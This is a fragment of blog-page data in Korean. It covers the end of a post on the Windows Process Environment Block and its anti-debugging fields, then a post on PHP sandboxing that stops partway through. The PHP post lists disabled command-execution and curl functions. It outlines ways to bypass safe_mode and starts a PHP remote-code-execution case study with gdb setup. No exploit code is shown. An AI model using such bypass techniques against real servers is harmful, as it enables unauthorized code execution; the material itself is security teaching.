Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x018</span> Ldr              <span class=\"token operator\">:</span> Ptr64 _PEB_LDR_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x030</span> ProcessHeap      <span class=\"token operator\">:</span> Ptr64 Void</code></pre></div>\n<h2 id=\"pebbeingdebugged\" style=\"position:relative;\"><a href=\"#pebbeingdebugged\" aria-label=\"pebbeingdebugged permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.BeingDebugged</h2>\n<ul>\n<li>Kernel32!IsDebuggerPresent() API</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">BOOL WINAPI <span class=\"token function\">IsDebuggerPresent</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>현재 프로세스가 디버깅을 당하는지를 판단해서 결과를 반환한다.</li>\n<li>API가 참조하는 정보가 바로 PEB.BeingDebugged 멤버이다. (디버깅 중이면1, 아니면 0을 반환)</li>\n</ul>\n<h2 id=\"pebimagebaseaddress\" style=\"position:relative;\"><a href=\"#pebimagebaseaddress\" aria-label=\"pebimagebaseaddress permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.ImageBaseAddress</h2>\n<ul>\n<li>PEB.ImageBaseAddress 멤버는 프로세스의 ImageBase 를 표시한다.</li>\n<li>GetModuleHandle() API는 ImageBase를 얻어내는 API이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">HMOUDLE WINAPI <span class=\"token function\">GetModuleHandle</span> <span class=\"token punctuation\">(</span>\n\t__in_opt  LPCTSTR lpModuleName\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>lpModuleName 파라미터에 NULL을 입력하고 GetModuleHandle()을 호출하면 프로세스가 로딩된 ImageBase를 리턴한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjklEQVQI11XL3QqCMBjGce//HqLzbqC76CgMmU5ci9yYr/vAvVvqFmYEwY/n6PkX6kl5W2nBGLmiFi8rCTlV9ZGXh4GeVzQ56K9oZidR1FG1CSEHXYBgrCmNvEveJA/eDhdKnYHF4mrH/fSzTEPykHHcbHHfdXVp1QN1n2cXnOTdLUedI2wb/iwe0ifbvQEgE6fbOMXfJwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/9e888556dc76a2d9f49f2c740922e0b7/37523/1.png\"\n        srcset=\"/static/9e888556dc76a2d9f49f2c740922e0b7/e9ff0/1.png 180w,\n/static/9e888556dc76a2d9f49f2c740922e0b7/f21e7/1.png 360w,\n/static/9e888556dc76a2d9f49f2c740922e0b7/37523/1.png 720w,\n/static/9e888556dc76a2d9f49f2c740922e0b7/024d6/1.png 961w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>\n<p>PEB.ImageBaseAddress 멤버를 EAX 레지스터 에 세팅하는 것을 확인할 수 있다.</p>\n</li>\n</ul>\n<h2 id=\"pebldr\" style=\"position:relative;\"><a href=\"#pebldr\" aria-label=\"pebldr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.Ldr</h2>\n<ul>\n<li>_PEB_LDR_DATA 구조체의 포인터이다.</li>\n<li>_PEB_LDR_DAT 구조체</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_PEB_LDR_DATA</span> <span class=\"token punctuation\">{</span>\n  BYTE       Reserved1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID      Reserved2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  LIST_ENTRY InMemoryOrderModuleList<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> PEB_LDR_DATA<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PPEB_LDR_DATA<span class=\"token punctuation\">;</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0</span><span class=\"token operator\">:</span><span class=\"token number\">007</span><span class=\"token operator\">></span> dt _PEB_LDR_DATA\nntdll<span class=\"token operator\">!</span>_PEB_LDR_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> Length           <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x004</span> Initialized      <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x008</span> SsHandle         <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x00c</span> InLoadOrderModuleList <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x014</span> InMemoryOrderModuleList <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x01c</span> InInitializationOrderModuleList <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x024</span> EntryInProgress  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x028</span> ShutdownInProgress <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x02c</span> ShutdownThreadId <span class=\"token operator\">:</span> Ptr32 Void</code></pre></div>\n<ul>\n<li>프로세스에 로딩된 모듈(DLL)의 로딩 베이스 주소를 직접 구할 수 있는 방법을 제공하기 때문이다.</li>\n<li>_LIST_ENTRY 타입의 멤버가 세 개 있다.\n<ul>\n<li>InLoadOrderModuleList</li>\n<li>InMemoryOrderModuleList</li>\n<li>InInitializationOrderModuleList</li>\n</ul>\n</li>\n<li>_LIST_ENTRY 구조체 정의는</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LIST_ENTRY</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LIST_ENTRY</span> <span class=\"token operator\">*</span>Flink<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LIST_ENTRY</span> <span class=\"token operator\">*</span>Blink<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> LIST_ENTRY<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PLIST_ENTRY<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>구조체 정의를 보면 _LIST_ENTRY는 양방향 연결 리스트 메커니즘을 제공하는 구조체이다.</li>\n<li>연결 리스트에는 _LDR_DATA_TABLE_ENTRY 구조체 정보가 담겨 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LDR_DATA_TABLE_ENTRY</span> <span class=\"token punctuation\">{</span>\n    PVOID Reserved1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    LIST_ENTRY InMemoryOrderLinks<span class=\"token punctuation\">;</span>\n    PVOID Reserved2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    PVOID DllBase<span class=\"token punctuation\">;</span>\n    PVOID EntryPoint<span class=\"token punctuation\">;</span>\n    PVOID Reserved3<span class=\"token punctuation\">;</span>\n    UNICODE_STRING FullDllName<span class=\"token punctuation\">;</span>\n    BYTE Reserved4<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    PVOID Reserved5<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">union</span> <span class=\"token punctuation\">{</span>\n        ULONG CheckSum<span class=\"token punctuation\">;</span>\n        PVOID Reserved6<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    ULONG TimeDateStamp<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> LDR_DATA_TABLE_ENTRY<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PLDR_DATA_TABLE_ENTRY<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>프로세스에 로딩된 DLL 모듈 마다 _LDR_DATA_TABLE_ENTRY 구조체가 하나씩 생성되고 이 구조체 들은 _LIST_ENTRY 양방향 연결 리스트로 연결된다.</li>\n<li>_LDR_DATA_TABLE_ENTRY 구조체 들이 많이 있는 데 연결 방법을 세 가지를 제공한다.</li>\n</ul>\n<h2 id=\"pebprocessheap--pebntglobalflag\" style=\"position:relative;\"><a href=\"#pebprocessheap--pebntglobalflag\" aria-label=\"pebprocessheap  pebntglobalflag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.ProcessHeap &#x26; PEB.NtGlobalFlag</h2>\n<ul>\n<li>PEB.ProcessHeap 멤버, PEB.NtGlobalFlag 멤버는 (PEB.BeingDebugged 멤버와 마찬가지로) 안티 디버깅에 사용된다.</li>\n<li>프로세스가 디버깅 중이라면 ProcessHeap, NtGlobalFlag 멤버는 특정한 값을 갖는다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#peb-%EC%A0%91%EA%B7%BC-%EB%B0%A9%EB%B2%95\">PEB 접근 방법</a></li>\n<li><a href=\"#method-1\">method 1</a></li>\n<li><a href=\"#method-2\">method 2</a></li>\n<li><a href=\"#peb-%EA%B5%AC%EC%A1%B0%EC%B2%B4-%EC%A0%95%EC%9D%98\">PEB 구조체 정의</a></li>\n<li><a href=\"#pebbeingdebugged\">PEB.BeingDebugged</a></li>\n<li><a href=\"#pebimagebaseaddress\">PEB.ImageBaseAddress</a></li>\n<li><a href=\"#pebldr\">PEB.Ldr</a></li>\n<li><a href=\"#pebprocessheap--pebntglobalflag\">PEB.ProcessHeap &#x26; PEB.NtGlobalFlag</a></li>\n</ul>\n</div>","excerpt":"window NT 데이터 구조체 이며 프로세스 정보를 담고 있는 구조체 PEB 접근 방법 TEB.ProcessEnvironmentBlock 멤버가 PEB 구조체의 주소 TEB 구조체는 FS 세그먼트 셀렉터가 가리키는 세그먼트 메모리의 base address에 위치한다. 그리고 ProcessEnvironmentBlock 멤버는 TEB 구조체 시작 부터 30 옵셋만큼 떨어져 있다. method 1 바로 PEB 주소를 구하는 방법 method 2 TEB 주소를 구한후 ProcessEnvironmentBlock 멤버를 이용  FS:[0x30] 주소 값을 확인할 수 있다. PEB 구조체 정의 PEB.BeingDebugged Kernel32!IsDebuggerPresent() API 현재 프로세스가 디버깅을 당하는지를 판단해서 결과를 반환한다. API가 참조하는 정보가 바로 PEB.BeingDebugged 멤버이다. (디버깅 중이면1, 아니면 0을 반환) PEB.ImageBaseAddress…","frontmatter":{"date":"January 03, 2021","title":"PEB (Process Environment Block)","categories":"Windows","author":"Zer0Luck","emoji":"🧊"},"fields":{"slug":"/window_1_theori/"}},"next":{"id":"dd671d44-da84-5ada-8e07-fb7f748efb94","html":"<h1 id=\"web-application--php\" style=\"position:relative;\"><a href=\"#web-application--php\" aria-label=\"web application  php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web Application : PHP</h1>\n<ul>\n<li>php를 활용한 rce는 다음 설명에서 간단하게 진행했고 밑의 링크를 통해 읽으시면 되요.</li>\n</ul>\n<p><a href=\"https://dnsdudrla97.github.io/web_application_rce1/\">Web Application RCE Case</a></p>\n<h1 id=\"php-security-1\" style=\"position:relative;\"><a href=\"#php-security-1\" aria-label=\"php security 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Security 1</h1>\n<ul>\n<li>다음은 PHP 보안 기법중 <code class=\"language-text\">Sandbox</code> 에 대하여 설명을 진행할께요.😛</li>\n</ul>\n<h2 id=\"php-sandbox\" style=\"position:relative;\"><a href=\"#php-sandbox\" aria-label=\"php sandbox permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Sandbox</h2>\n<aside>\n💡 SandBox 가 뭘까?\n> 애플리케이션 환경에서 대상 리눅스 명령어를 사용할 수 있는 권한이 있더라고 대상 애플리케이션이 설정한 권한 이외의 행동을 수행할 수 없게 한다.\n</aside>\n<p><strong>Disable Function</strong></p>\n<ul>\n<li>애플리케이션 설정된 PHP 함수에 대해 액세스를 제한하는 기능</li>\n<li>공격할 수 있는 구간이 존재하여 <code class=\"language-text\">명령 실행(system, proc_open, shell_exec)</code>, <code class=\"language-text\">소켓(socket)</code> , <code class=\"language-text\">통신(curl)</code> 해당 함수들을 이용하는 경우 <code class=\"language-text\">Disable Function으로 작성할 시 공격이 어렵다.</code></li>\n</ul>\n<aside>\n💡 Sandbox 개념에서 시스템 함수들이 비활성화되어 있지만 우회하면 되겠죠?\n</aside>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\"><span class=\"token title important\"><span class=\"token punctuation\">##</span> Disable Function Example</span>\n<span class=\"token list punctuation\">-</span> exec\n<span class=\"token list punctuation\">-</span> passthru\n<span class=\"token list punctuation\">-</span> shell_exec\n<span class=\"token list punctuation\">-</span> system\n<span class=\"token list punctuation\">-</span> proc_open\n<span class=\"token list punctuation\">-</span> popen\n<span class=\"token list punctuation\">-</span> curl_exec\n<span class=\"token list punctuation\">-</span> curl_multi_exec\n<span class=\"token list punctuation\">-</span> parse_ini_file\n<span class=\"token list punctuation\">-</span> show_source</code></pre></div>\n<p><strong>Safe_Mode</strong></p>\n<ul>\n<li><code class=\"language-text\">chroot</code> 가 설정된 <code class=\"language-text\">/var/www/html</code> 디렉토리 가 웹 루트로 설정되어 쉘 명령(<code class=\"language-text\">/bin/ls, /bin/id</code>) 을 사용할 수 없게 된다.</li>\n<li>uid, gid가 다른 경우 접근할 수 없다.\n<ul>\n<li><code class=\"language-text\">/etc/passwd</code> 와 같은 파일의 경우 <code class=\"language-text\">safe_mode</code> 의 특정 옵션이 켜지면 접근할 수 없다.</li>\n</ul>\n</li>\n<li><code class=\"language-text\">safe_mode</code> 가 걸린 PHP 에서 시스템 명령을 사용하는 경우 예외 처리되는 모습을 확인할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\">cat /etc/php.ini | grep safe_mode</code></pre></div>\n<ul>\n<li><code class=\"language-text\">/etc</code> 밑에 php.ini 설정 파일로 safe_mode on/off 로 설정이 가능하다.</li>\n</ul>\n<p><strong>Safe_Mode Bypass</strong></p>\n<ul>\n<li>간단하게 <code class=\"language-text\">safe_mode</code> 에 대해서 설명을 했는데 이를 우회하기 위해서는 몇가지 방안이 있다.\n<ul>\n<li>Safe_Mode 취약한 함수를 사용해서 Exploit를 진행 (curl, socket, …)</li>\n</ul>\n</li>\n<li>PHP 에서 사용하는 모듈 취약점을 이용해서 Exploit을 진행\n<ul>\n<li>Mode cgi, PHP-FPM</li>\n</ul>\n</li>\n<li>PHP 에는 많은 CVE가 존재\n<ul>\n<li>모듈 취약점을 사용할시 PHP 버전에 의존하지 않아도 된다.</li>\n<li>PHP 버전과 관계 없는 해당 모듈을 사용하는 하위 버전이 전부 작동한다.</li>\n</ul>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQY012QbU/CQBCEK28FFQqlVKS0Uit9u6uNEQjw///XY3bN+cEPk5m93ZlMzivrE69JxTp+J4xynuY7xn7EcBzyMFwymqxVCwajlcJptxOWWe49090oyi/q9kJe9JjuStWeSd8MWW5J0oZ91hJvP0gPVt9l/oVhuyt5XiQaqoGtvVI1ZyTYfN441t90/Z3aXMgOliDMiOKCxTJVk7R37Np5g0DDpKVn+ztVc9Im82CPP4uZTDfKYhI9fXzBn23+jP/hvkIa/gDSuGPr6m+9UgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png\"\n        srcset=\"/static/68b2df255fae24cf0c75a2d91c56e424/e9ff0/0.png 180w,\n/static/68b2df255fae24cf0c75a2d91c56e424/f21e7/0.png 360w,\n/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png 720w,\n/static/68b2df255fae24cf0c75a2d91c56e424/58bb7/0.png 985w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"php-rce-1-day-case\" style=\"position:relative;\"><a href=\"#php-rce-1-day-case\" aria-label=\"php rce 1 day case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP RCE 1-day case</h1>\n<ul>\n<li>취약한 대상 애플리케이션 환경에서 PHP를 사용하고 있으며 이에 대한 공격 벡터가 존재하는 경우 PHP sandbox를 우회하기 위해 SQLite 모듈을 활용하고, 최종적으로 RCE를 수행하는 과정에 대해서 설명하도록 하겠습니다.</li>\n</ul>\n<h3 id=\"php-debugging\" style=\"position:relative;\"><a href=\"#php-debugging\" aria-label=\"php debugging permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Debugging</h3>\n<ul>\n<li>취약한 모듈을 분석하기 위해 php+apache 디버깅을 활용하여 동적 분석을 진행한다.</li>\n</ul>\n<p><strong>gdb를 활용하여 process debugging 진행</strong></p>\n<ul>\n<li>대상 PID를 gdb로 연결하기 위해 <code class=\"language-text\">getmypid</code> 출력을 한후 sleep 함수를 사용해 유효 상태로 대기시키는 동안 연결을 진행하도록 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>구현된 코드를 실행한 후 출력된 PID 를 gdb에 연결을 진행한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span>root@localhost html<span class=\"token punctuation\">]</span><span class=\"token comment\"># curl http://localhost/dbg.php</span>\n<span class=\"token number\">1876</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">p</code> 옵션을 활용하여 PID 번호 매칭하여 디버깅을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gdb <span class=\"token operator\">-</span>p <span class=\"token punctuation\">[</span>pid<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>구현된 환경에서 gdb를 활용하여 프로세스 디버깅 상태가 완료된 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY012ObQuCQBCEL1MrKj297FUzNcq004IsI/r/P2tiFyLpwzDssvvMiEN+wy6tkO4vSLIawSKDIyP4swSj8RK9vkTf8mHaikWzYXrs1kDBUzGmbgjXi9hFqVvU1zfO1RPFuQUF5MWdRUGkTXTioImz/gPO4MiQ3R4G7KKsntD1C3nR4Fg07HGqsQpzqCDBVIacTKKmXaBp+zBMCWG4PJO44al8gMDbRHOj+XLPafTYPf7CfkDF0O7+A385ZDlcDFOsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png\"\n        srcset=\"/static/2e73bb069d875686184fee6edfb89f4e/e9ff0/1.png 180w,\n/static/2e73bb069d875686184fee6edfb89f4e/f21e7/1.png 360w,\n/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png 720w,\n/static/2e73bb069d875686184fee6edfb89f4e/302a4/1.png 1080w,\n/static/2e73bb069d875686184fee6edfb89f4e/511f0/1.png 1172w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 Process 매핑된 라이브러리 주소를 확인하여 오프셋 계산을 통해 ROP 기법을 수행할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: 